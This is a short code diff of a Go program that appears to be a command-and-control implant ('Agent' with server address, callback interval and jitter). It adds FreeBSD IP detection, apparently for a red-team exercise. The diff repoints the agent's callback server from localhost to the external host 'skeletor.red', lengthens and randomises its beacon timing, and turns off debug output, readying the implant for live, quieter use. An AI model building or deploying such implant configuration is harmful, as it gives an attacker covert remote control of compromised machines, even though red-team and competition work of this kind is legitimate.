@@ -45,6 +45,13 @@ func getLocalIP() string {
 			return "?.?.?.?" // Fallback if command fails
 		}
 		return strings.TrimSpace(string(out))
+	} else if runtime.GOOS == "freebsd" {
+		cmd := exec.Command("/bin/sh", "-c", "ifconfig vtnet1 | awk '$1 == \"inet\" {print $2}'") //temp solution for UBHS Spring'26
+		out, err := cmd.Output()
+		if err != nil {
+			return "?.?.?.?" 
+		}
+		return strings.TrimSpace(string(out))
 	} else {
 		addrs, err := net.InterfaceAddrs()
 		if err != nil {
@@ -136,11 +143,11 @@ func (agent *Agent) Sleep() {
 func main() {
 	agent := Agent{
 		LocalIP:          getLocalIP(),
-		ServerIP:         "127.0.0.1",
+		ServerIP:         "skeletor.red",
 		ServerPort:       80,
-		CallbackInterval: 15,
-		Jitter:           5,
-		Debug:            true,
+		CallbackInterval: 120,
+		Jitter:           15,
+		Debug:            false,
 		Client: &http.Client{
 			Timeout: 10 * time.Second,
 		},
